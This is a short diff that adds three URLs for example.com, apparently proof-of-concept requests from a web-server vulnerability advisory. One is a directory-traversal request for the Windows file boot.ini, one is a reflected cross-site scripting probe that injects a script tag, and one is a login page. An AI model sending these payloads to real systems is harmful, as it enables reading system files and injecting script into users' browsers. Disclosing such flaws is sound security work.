@@ -1,0 +1,7 @@
+http://www.example.com/%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cboot.ini
+ 
+ 
+http://www.example.com/index.html%27%22--%3E%3Cscript%3Ealert%28%22Corelan%22%29%3C/script%3E
+ 
+ 
+http://www.example.com/lite-chat-login.html
